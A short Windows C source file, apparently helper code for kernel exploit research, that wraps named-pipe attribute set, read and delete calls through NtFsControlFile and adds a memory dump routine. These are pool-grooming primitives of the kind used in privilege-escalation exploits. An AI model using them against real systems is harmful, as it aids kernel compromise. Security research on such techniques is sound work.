// NTFS.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <winternl.h>
#include <stdbool.h>
#include <winioctl.h>
#pragma comment(lib,"ntdll.lib")

#include "helper.h"

static char tmp_buffer[0x10000];
void pipe_init(PIPES* pipes) {
	if (!CreatePipe(&pipes->read, &pipes->write, NULL, 0x1000)) {
		printf("createPipe fail\n");
		return 1;
	}
	return 0;
}

int pipe_write_attr(PIPES* pipes, char* name, void* value, int total_size) {
	size_t length = strlen(name);
	memcpy(tmp_buffer, name, length + 1);
	memcpy(tmp_buffer + length + 1, value, total_size - length - 1);
	IO_STATUS_BLOCK  statusblock;
	char output[0x100];
	int mystatus = NtFsControlFile(pipes->write, NULL, NULL, NULL,
		&statusblock, 0x11003C, tmp_buffer, total_size,
		output, sizeof(output));
	if (!NT_SUCCESS(mystatus)) {
		printf("pipe_write_attr fail 0x%x\n", mystatus);
		return 1;
	}
	return 0;
}
void pipe_read_attr(PIPES* pipes, char* name, char* output,int size) {
	IO_STATUS_BLOCK statusblock;
	int mystatus = NtFsControlFile(pipes->write, NULL, NULL, NULL,
		&statusblock, 0x110038, name,strlen(name)+1,
		output, size);
	if (!NT_SUCCESS(mystatus)) {
		printf("pipe_read_attr fail 0x%x\n", mystatus);
		return 1;
	}
	return 0;
}

int pipe_delete_attr(PIPES* pipes, char* name) {
	IO_STATUS_BLOCK statusblock;
	char output[0x100];

	int mystatus = NtFsControlFile(pipes->write, NULL, NULL, NULL,
		&statusblock, 0x11003C, name, strlen(name) + 1,
		output, sizeof(output));
	if (!NT_SUCCESS(mystatus)) {
		printf("pipe_delete_attr fail 0x%x\n", mystatus);
		return 1;
	}
	return 0;
}

void pipe_destory(PIPES* pipes) {
	if (pipes->read)
		CloseHandle(pipes->read);
	if (pipes->write)
		CloseHandle(pipes->write);
}


void dump_mem(void* addr, int size) {
	for (int i = 0; i < size; i += 0x10) {
		printf("0x%04x: 0x%016llx 0x%016llx\n", i, *(ULONGLONG*)((char*)addr+i), *(ULONGLONG*)((char*)addr +i + 8));
	}
}

void DEBUG_IMP(char* file,int line,char* fmt,...) {
	printf("%s:%d ", file, line);
	va_list args;
	va_start(args, fmt);
	vprintf(fmt, args);
	va_end(args);

}